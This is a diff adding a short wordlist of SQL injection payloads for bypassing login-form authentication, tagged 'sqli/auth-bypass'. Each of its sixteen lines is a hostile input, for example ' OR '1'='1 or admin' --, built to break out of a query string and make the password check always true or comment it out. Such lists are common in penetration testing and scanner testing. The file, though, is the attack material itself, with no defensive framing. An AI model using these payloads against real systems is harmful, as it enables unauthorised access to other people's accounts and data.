@@ -1,0 +1,16 @@
+# sqli/auth-bypass — login form payloads
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+admin' --
+admin' #
+admin'/*
+') OR ('1'='1
+') OR ('1'='1' --
+1' OR 1=1 LIMIT 1 --
+' OR 1=1 --
+' OR 1=1#
+' UNION SELECT NULL --
+admin' OR 1=1 --
